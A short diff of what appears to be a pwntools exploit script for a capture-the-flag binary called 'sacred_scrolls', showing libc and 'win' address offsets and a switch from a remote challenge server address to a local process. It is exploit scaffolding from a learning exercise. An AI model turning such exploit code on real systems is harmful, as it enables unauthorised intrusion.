@@ -15,9 +15,9 @@ win_addr = 0xebcf5
 win_diff = libc_system - win_addr
 data_section = 0x603000
 
-#io = process("./sacred_scrolls")
-ip, port = "139.59.170.23", 32060
-io = remote(ip, port)
+io = process("./sacred_scrolls")
+#ip, port = "139.59.170.23", 32060
+#io = remote(ip, port)
 
 io.recvuntil(b"tag: ") # Tag - anything
 io.sendline(b"1")
